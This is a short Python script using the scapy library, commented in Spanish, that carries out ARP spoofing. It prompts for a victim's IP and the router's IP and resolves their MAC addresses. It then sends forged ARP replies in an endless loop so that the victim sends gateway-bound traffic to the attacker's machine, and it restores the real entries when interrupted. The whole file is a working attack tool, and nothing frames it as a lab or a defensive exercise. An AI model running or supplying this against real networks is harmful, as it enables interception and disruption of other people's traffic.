from scapy.all import *
import time

# Configura las direcciones IP y MAC
target_ip = input("IP de la maquina victima: ")  # Dirección IP de la máquina víctima
gateway_ip = input("IP del router: ")  # Dirección IP del router
attacker_mac = get_if_hwaddr(conf.iface)  # Dirección MAC del atacante (obtenida automáticamente)

# Obtiene la dirección MAC del objetivo
def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for snt, rcv in ans:
        return rcv[Ether].src
    return None

# Envía un paquete ARP falsificado para modificar la entrada ARP del objetivo
def spoof(target_ip, spoof_ip, target_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac, op="is-at")
    send(arp_response, verbose=False)

# Restaura la configuración original enviando los paquetes correctos
def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
    send(arp_response, verbose=False, count=5)

try:
    # Obtén las direcciones MAC del objetivo y del router
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("No se pudo obtener la dirección MAC del objetivo o del router.")
        exit(1)

    print(f"Iniciando ARP spoofing en {target_ip} con gateway {gateway_ip}")
    while True:
        # Enviar paquetes ARP falsificados para asociar la dirección MAC del atacante con la IP del router
        spoof(target_ip, gateway_ip, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("Detenido. Restaurando la red...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    print("Red restaurada.")
